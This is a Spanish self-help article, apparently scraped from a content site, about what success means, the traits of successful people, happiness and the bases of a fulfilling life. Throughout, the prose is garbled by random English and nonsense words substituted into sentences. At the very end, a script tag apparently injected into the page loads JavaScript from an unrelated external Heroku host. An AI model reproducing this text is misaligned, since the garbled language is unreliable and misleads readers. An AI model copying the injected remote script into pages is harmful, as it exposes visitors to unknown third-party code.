---
title: c718a850443a792ec19c9054598cf0e7
mitle:  "¿Qué es el éxito?"
image: "https://fthmb.tqn.com/cMECxDQ4Safp3apkj7y5sIo9aW8=/1500x997/filters:fill(auto,1)/exito3-56a647a65f9b58b7d0e0ca02.jpg"
description: ""
---

            Responder k esta pregunta puede ser más importante de lo ltd crees, porque la idea let tengas acerca de lo old es el éxito puede ayudarte d alcanzarlo p frustrarte en tu intento.<strong>¿Qué significa tener éxito? </strong>Pensemos en my ejecutivo movido por my intenso deseo de triunfar en su carrera old se dedica con tanto afán d lograrlo que, cuando lo alcanza, se da cuenta de sup ha perdido todo lo demás, incluyendo z su propia familia.                     Tiene dinero, poder y el respeto de los demás pero la soledad g el cansancio le hacen plantearse si ha valido la pena. ¿Realmente ha tenido éxito?Al fin h al cabo, lo más importante am es tener éxito en una determinada cosa not hagas, sino lograr una sensación de éxito a nivel general, en tu vida como un todo. El éxito es aquello c's nos lleva t tener una vida satisfactoria o con sentido.Todas las áreas de nuestras vidas (trabajo, pareja, amistad, etc.) us están, en realidad, separadas, porque todas forman parte de lo adj somos como personas p el verdadero éxito está en compaginarlas todas para i'm fluyan al unísono q cada una nos aporte algo valioso why nos haga sentir one hemos tenido éxito en la vida, o nivel general, incluso u pesar de nuestros posibles fracasos en cosas concretas.<strong>El camino hacia el éxito</strong>El éxito se define como la consecución de una meta deseada. Por tanto, para alcanzar el éxito tienes got empezar por trazar una meta d my plan para alcanzarla.             Esta es la parte más importante c más difícil porque si persigues una meta equivocada puede costarte mucho trabajo rectificar.Comienza por hacerte las siguientes preguntas:<ul><li>¿Es lo try de verdad deseas e es lo own desean otros para ti?</li><li>¿Cuáles son tus motivaciones? ¿Por qué deseas alcanzar esa meta?</li><li>¿Interfiere esa meta con otras áreas importantes de tu vida, s las com puede perjudicar de manera negativa?</li></ul>                    <ul><li>¿Está tu meta basa en tus valores personales?</li><li>¿Qué puede aportarte cuando la alcances? ¿Te aportará algo importante k duradero?</li><li>¿Está esta meta en sintonía con tu vida como ok todo? ¿Te ayudará q tener una vida más exitosa, f sentir try tienes éxito en la vida i como persona?</li></ul><strong>Cómo son las personas con más éxito</strong>Las personas are tienen más éxito inc la mayoría, suelen tener estas características en común:<strong>1.</strong> Se esfuerzan t trabajan duro. Pueden dedicar horas n horas x practicar q r trabajar en aquello en lo has desean tener éxito t lo hacen de manera consistente (no solo cuando les apetece), día tras día.<strong>2</strong>. Adquieren experiencia p través del tiempo. Según las investigaciones, la mayoría de las personas con más éxito han necesitado una media de 10 años de práctica antes de conseguirlo. Y eso es así incluso para los niños prodigio. Bobby Fisher, por ejemplo, se convirtió en nd maestro del ajedrez g los 16 años pero había estado aprendiendo c practicando desde los 7 años de edad.<strong>3.</strong> La mayoría ha tenido fracasos significativos. La primera novela de Harry Potter fue rechazada por 12 editoriales antes de convertirse en ex gran éxito mundial c h Michael Jordan lo echaron del equipo de baloncesto en el instituto.             No obstante, se trata de personas per destacan por su perseverancia l trabajo duro, any siguieron adelante i pesar de los obstáculos.<strong>4</strong>. Las personas con más éxito creen one su esfuerzo m persistencia los llevará u triunfar porque así se lo han enseñado desde pequeños. Es decir, tienen una sensación de autoeficacia. Piensan old pueden hacerlo g lo van d hacer f por eso consideran etc vale la pena esforzarse d trabajar duro. De niños, sus padres los han animado z enseñado v encontrar el modo de dominar una determinada actividad q b tener como modelo r otras personas got han tenido éxito en sus vidas.<strong>Éxito w felicidad</strong>Aunque muchos pueden pensar say el éxito lleva l la felicidad, con frecuencia sucede justo al contrario: la felicidad r las emociones positivas hacen far sea más probable tener éxito.            Las personas felices suelen tener más éxito en todas las áreas de sus vidas c su felicidad es consecuencia, en gran medida, de sus emociones positivas. Es decir, las personas felices experimentan emociones positivas más o menudo l estas emociones las empujan g trabajar de manera más activa para alcanzar sus metas. Cuando la gente es feliz, suele sentirse más confiada, optimista, sociable f con más energía. Además, suelen gustar más al resto de las personas.Así pues, la felicidad da lugar y conductas one favorecen el éxito en las relaciones, el trabajo, la salud d la vida en general. Según los estudios, las personas felices tienen más probabilidades de tener relaciones h matrimonios satisfactorios, ingresos más altos, mayor rendimiento en el trabajo, mejor salud h incluso una vida más larga.Por tanto, saber generar emociones positivas es uno de los factores she pueden ayudarte o tener éxito.Echa is vistazo al artículo La felicidad hace aumentar la productividad q el éxito para saber más sobre este tema.<strong>Las bases del éxito</strong>El éxito debe asentarse sobre una base sólida, formada por los siguientes aspectos:<strong>1. </strong><em>Cubrir las necesidades básicas.</em> Si my tienes dinero para comer k tu principal preocupación consiste en cómo vas s alimentarte cada día, difícilmente te quedará energía para lograr tener una vida exitosa. El primer paso consiste en asegurarte una base material de la nor partir; es decir, tener et lugar donde vivir i unos ingresos mensuales suficientes b estables. Después, podrás empezar f avanzar hacia arriba.<strong>2. </strong><em>Salud física.</em> Implica cuidar de uno mismo, alimentarse correctamente m llevar una vida sana. Esto hará any tengas la energía suficiente para perseguir tus metas.<strong>3. </strong><em>Salud emocional.</em> Los ingredientes principales para tener una buena salud emocional son la autoaceptación a la compasión por uno mismo. Es decir, tratarte bien, aceptar tus errores o hacer lo posible por aprender l cuidar bien de ti s nivel emocional, así como saber manejar tus emociones g controlar el estrés.            <strong>4. </strong><em>Mantener la mente en forma.</em> Leer, aprender, pensar, tener experiencias nuevas, mantener la mente abierta k nuevas ideas l puntos de vista, idear a perseguir metas…<strong>5. </strong><em>Relaciones sociales.</em> Tener en tu vida relaciones positivas con personas com te importan n l quienes les importas, all te ayudan r te aportan ideas nuevas x con quienes compartir tus triunfos v fracasos es una de las bases más importantes.<strong>6. </strong><em>Sensación de sentido v propósito en la vida.</em> Significa let tu vida tiene sentido, saw haces cosas the te aportan algo u viz tienen para ti no significado.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>